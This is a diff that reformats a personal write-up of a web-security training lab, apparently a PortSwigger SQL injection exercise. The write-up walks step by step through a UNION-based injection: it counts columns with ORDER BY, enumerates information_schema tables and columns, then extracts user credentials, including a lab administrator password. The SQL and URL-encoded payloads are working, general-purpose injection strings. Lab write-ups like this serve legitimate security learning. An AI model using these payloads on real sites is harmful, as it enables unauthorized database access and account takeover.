@@ -9,33 +9,62 @@ i see the road to go:
 3. somehow get administrator rights
 
 some googling i know that: "To get the names of all tables in a database, the most ANSI-compliant SQL query uses the INFORMATION_SCHEMA.TABLES view, which works across most major database systems". So now i need to get info from that table.
+
+
 ![alt text](images/image.png)
 i found the request and send it to repeater. sent that request to see how the web reponse to my request?
+
+_______________________________________________________________________________________________________________
+
 ![alt text](images/image-1.png)
 nothing special, just print those result out.
+
+_______________________________________________________________________________________________________________
+
 i think their sql code is gonna be like:
+
+```sql
 SELECT TITLE, CONTENT 
 FROM PRODUCTS  
 WHERE COLUMN_NAME = 'Corporate gifts';
+```
 
 we can probably do like 
 
+```sql
 SELECT TITLE, CONTENT 
 FROM PRODUCTS  
 WHERE COLUMN_NAME = 'Corporate gifts '
 UNION
 SELECT TABLE_NAME, NULL #im not sure how many columns they are fetching
 FROM INFORMATION_SCHEMA.TABLES --';
+```
 
-okay so first i need to figure out how many columns the original query is fetching. lets try with the payload ' ORDER BY 1-- until we see an error pops up
+_______________________________________________________________________________________________________________
+
+okay so first i need to figure out how many columns the original query is fetching. lets try with the payload 
+
+```sql
+' ORDER BY 1--
+```
+```http
+'+ORDER+BY+1--
+```
+
+until we see an error pops up
 
 ![alt text](images/image-2.png)
 
-there it is, the server response with "500 Internal Server Error", meaning we only have 2 columns here.
+there it is, the server responsed us with "500 Internal Server Error", meaning we only have 2 columns here.
 
 that gives us the payload to retrieve tables' names from INFORMATION_SCHEMA.TABLES
+
+```sql
 ' UNION SELECT table_name, NULL FROM information_schema.tables--
+```
+```http
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+```
 
 ![alt text](images/image-3.png)
 
@@ -50,12 +79,19 @@ i think "users_slpnlb" and "administrable_role_authorizations" might be having w
 now i dive deeper into that "users_slpnlb" table by first exploring what columns does it have. i can do this by looking at the "column_name" at information_schema.columns where that column belongs to "users_slpnlb" table.
 
 the payload is gonna be 
+
+```sql
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_slpnlb'--
+```
+```http
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name+=+'users_slpnlb'--
+```
 
 ![alt text](images/image-4.png)
 
-this is so sad. i cant find anything useful...
+this is so sad. i cant find anything useful... i did reload a few times because of network problems tho...
+_______________________________________________________________________________________________________________
+
 i tried reload the whole thing and find all tables' names again
 
 ![alt text](images/image-5.png)
@@ -66,12 +102,19 @@ interestingly, i found it again, but this time with different suffix! i guess th
 ![alt text](images/image-7.png)
 
 there we go, with the right table's name i can finally find out the columns' name. 
+
+```
 username_gtvisi
 password_wywjlz
+```
+
 time to retrieve data from em'!
 
 the payload is now simply be:
+
+```http
 '+UNION+SELECT+username_gtvisi,+password_wywjlz+FROM+users_mjzduz-- 
+```
 
 ![alt text](images/image-8.png)
 
@@ -82,9 +125,13 @@ we found it. the administrator's acc!
 there is even a guy named 'wiener'. bruh :D
 
 now that i have the administrator's acc, i'm just gonna head back the login page and enjoy :D
+
+```
 administrator
 t7p07ok8cykxwaqebjfj
+```
 
 ![alt text](images/image-10.png)
 
-and that's how i solved the lab :D its through many processes, but the same trick of using sql "UNION" is used over and over again.
+and that's how i solved the lab :D 
+it has been through many processes, but the same trick of using sql "UNION" was used over and over again.
